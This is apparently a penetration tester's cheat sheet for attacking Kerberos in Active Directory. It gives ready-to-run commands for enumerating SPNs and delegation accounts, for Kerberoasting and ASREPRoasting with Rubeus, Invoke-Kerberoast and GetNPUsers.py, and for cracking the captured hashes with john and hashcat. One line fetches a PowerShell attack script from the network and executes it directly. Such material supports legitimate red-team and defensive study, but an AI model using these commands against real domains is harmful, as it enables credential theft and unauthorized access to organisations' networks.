# Kerberos Info Gathering
## Query SPNs
If you want to first only query registered SPNs to limit the noise, there are different methods.   
**CMD.exe**   
Using cmd.exe: (The following example searches all SPNs in the domain from MSSQL servers)   
`setspn -Q *MSSQL/*`   

Using cmd.exe on a foreign domain: (The following example searches for Hyper-V related SPNs)   
`setspn -Q *hyper*/* -T <domainname>`   

**Native PowerShell**   
```
$search = [adsisearcher]"(&(sAMAccountType=805306368)(servicePrincipalName=*))"
$search.PageSize = 10000
$spnusers = $search.FindAll()
```   
**BloodHound**   
Using BloodHound: (list all user accounts with an SPN)   
`MATCH (u:User {hasspn:true}) RETURN u`   
You can even expand the BloodHound query to include pathes to computers from these accounts:   
`MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p`   

## Get Kerberos Delegation Accounts
Requires AD Modules:   
`Get-ADObject -filter { (UserAccountControl -BAND 0x0080000) -OR (UserAccountControl -BAND 0x1000000) -OR (msDS-AllowedToDelegateTo -like '*') } -prop Name,ObjectClass,PrimaryGroupID,UserAccountControl,ServicePrincipalName,msDS-AllowedToDelegateTo`   

# Kerberos Attacks
## Kerberoasting
From Windows against single user using Rubeus.exe:   
`.\Rubeus.exe kerberoast /user:svc_mssql /nowrap`   
Using Invoke-Kerberoast:    
`IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -OutputFormat Hashcat`   

### Cracking
`john --format=krb5tgs --wordlist=wordlist svc_mssql`   
`hashcat -a 0 -m 13100 svc_mssql wordlist`   

## ASREPRoast 
Query accounts for "do not require Kerberos pre-authentication":   
`([adsisearcher]"(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))").FindAll()`   
Find such users in BloodHound:   
`MATCH (u:User {dontreqpreauth:true}) RETURN u`   

If accounts do not require kerberos pre-authentication, the tool GetNPUsers.py can be used to do ASREPRoasting:   
`GetNPUsers.py -request domain.local/someaccount:`   

On Windows:   
`.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast`   
`Get-ASREPHash -Username someuser123 -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)`   

### Cracking
`john --wordlist=passwords_kerb.txt hashes.asreproast`   
`hashcat --attack-mode 0 --hash-type 18200 hashes.asreproast /srv/wordlists/uncompressed/crackstation-human-only.txt --rules-file /srv/rules/nsa_500.txt`   
